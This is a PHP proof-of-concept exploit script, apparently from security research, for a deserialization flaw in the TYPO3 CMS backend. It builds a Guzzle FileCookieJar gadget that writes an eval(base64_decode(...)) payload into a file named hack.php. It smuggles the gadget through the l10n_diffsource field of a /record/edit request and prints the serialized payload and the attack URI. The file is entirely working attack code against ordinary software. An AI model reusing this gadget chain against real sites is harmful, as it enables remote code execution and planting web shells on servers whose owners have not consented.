<?php
namespace GuzzleHttp\Cookie {
    class SetCookie
    {
        private static $defaults = [
            'Name'     => null,
            'Value'    => null,
            'Domain'   => null,
            'Path'     => '/',
            'Max-Age'  => null,
            'Expires'  => null,
            'Secure'   => false,
            'Discard'  => false,
            'HttpOnly' => false
        ];
        private $data;

        public function __construct(array $data = [])
        {
            $this->data = array_replace(self::$defaults, $data);
        }
    }

    class CookieJar
    {
        private $strictMode;
        private $cookies = [];

        public function setCookie(SetCookie $cookie)
        {
            $this->cookies[] = $cookie;
        }
    }

    class FileCookieJar extends CookieJar
    {
        private $filename;
        private $storeSessionCookies;

        public function __construct($cookieFile, $storeSessionCookies = false)
        {
            $this->filename = $cookieFile;
            $this->storeSessionCookies = $storeSessionCookies;
        }
    }
}

namespace {
    $token = readline('/record/edit token: ');

    $code = preg_replace(
        '#(^<\?php|\?>$)#', '',
        file_get_contents(__DIR__ . '/l10n-diffsource-payload-typo3.php')
    );
    $targetFileName = 'hack.php';
    $setCookie = new \GuzzleHttp\Cookie\SetCookie([
        'Name' => 'CookieName',
        'Domain' => 'CookieDomain',
        'Expires' => 1,
        'Discard' => false,
        'Value' => '<hr><pre><?php eval(base64_decode(\'' . base64_encode($code) . '\')); ?></pre><hr>'
    ]);

    $fileCookieJar = new \GuzzleHttp\Cookie\FileCookieJar($targetFileName, true);
    $fileCookieJar->setCookie($setCookie);
    $payload = serialize($fileCookieJar);

    $parameters = [
        'route' => '/record/edit',
        'token' => $token,
        'edit' => [
            'pages' => [
                '-1' => 'new',
            ]
        ],
        'overrideVals' => [
            'pages' => [
                'sys_language_uid' => '1',
                'l10n_parent' => '1',
                'l10n_diffsource' => $payload,
            ]
        ],
        'returnUrl' => '/typo3/' . $targetFileName,
    ];

    $query = http_build_query($parameters, null, '&', PHP_QUERY_RFC3986);
    $uri = sprintf('http://typo3v9-hack.ddev.site/typo3/?%s', $query);

    echo '---' . PHP_EOL;
    echo 'Payload' . PHP_EOL;

    print_r($payload . PHP_EOL);

    echo '---' . PHP_EOL;
    echo 'URI Payload' . PHP_EOL;

    print_r($uri . PHP_EOL);

    echo '---' . PHP_EOL;
}

